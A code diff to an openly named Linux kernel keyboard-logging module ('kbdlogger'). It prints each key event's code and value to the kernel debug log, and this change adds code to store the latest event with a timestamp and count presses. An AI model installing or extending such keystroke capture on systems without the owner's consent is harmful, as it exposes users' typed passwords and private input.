@@ -29,6 +29,7 @@
 #include <linux/fs.h>
 #include <linux/cdev.h>
 #include <linux/kobject.h>
+#include <linux/time.h>
 #include <asm/uaccess.h>
 
 MODULE_AUTHOR("Rafael do Nascimento Pereira <rnp@25ghz.net>");
@@ -44,12 +45,13 @@ struct kobject kobj;
 struct class   *kbdclass;
 struct device  *kbddev;
 struct cdev    kbdlogger_cdev;
+struct input_event keyev;
 
-dev_t    devnum;
-uint64_t pressev;
-uint64_t relev;
-uint64_t autorepev;
-char     *starttime;
+dev_t devnum;
+u64   pressev;
+u64   relev;
+u64   autorepev;
+char  *starttime;
 
 static int __init kbdlogger_init(void);
 
@@ -135,6 +137,11 @@ static void kbdlogger_event(struct input_handle *handle, unsigned int type,
 	if (type == EV_KEY) {
 		printk(KERN_DEBUG pr_fmt("Key event. Dev: %s, Type: %d, Code: %d, Value: %d\n"),
 		dev_name(&handle->dev->dev), type, code, value);
+		pressev++;
+		keyev.value = value;
+		keyev.type  = type;
+		keyev.code  = code;
+		do_gettimeofday(&keyev.time);
 	}
 }
 
@@ -219,6 +226,7 @@ static int __init kbdlogger_init(void)
 	if(kobject_set_name(&kobj, "kbdlogger"))
 		goto fail;
 
+	pressev = 0;
 	return 0;
 fail:
 	kbdlogger_exit();
